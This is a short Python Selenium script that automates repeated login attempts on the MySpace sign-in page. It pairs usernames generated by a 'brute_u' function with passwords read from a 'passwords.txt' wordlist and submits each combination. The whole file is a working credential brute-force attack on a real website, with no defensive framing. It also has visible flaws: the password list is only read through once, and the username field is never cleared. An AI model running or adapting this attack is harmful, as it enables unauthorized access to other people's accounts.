import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from cracked import brute_u
from selenium.webdriver.common.keys import Keys

ser = Service("H://chromedriver.exe")
driver = webdriver.Chrome(service=ser)
f = open('passwords.txt', 'r')

def main():
    x = int(input('enter length range for potential username: '))
    driver.maximize_window()
    driver.get("https://myspace.com/signin")
    usr_box = driver.find_element(By.NAME, "email")
    pass_box = driver.find_element(By.NAME, "password")
    sub_box = driver.find_element(By.CLASS_NAME, "primary")
    act = ActionChains(driver)
    list = brute_u(x)
    for u in list[1:]:
        user = u.strip()
        act.click(on_element=usr_box).send_keys(user).perform()
        for pw in f:
            password = pw.strip()
            act.click(on_element=pass_box).key_down(Keys.CONTROL).send_keys(Keys.ARROW_RIGHT + Keys.BACKSPACE).perform()
            act.reset_actions()
            act.click(on_element=pass_box).send_keys(password).perform()
            act.click(on_element=sub_box).perform()

if __name__ == '__main__':
    main()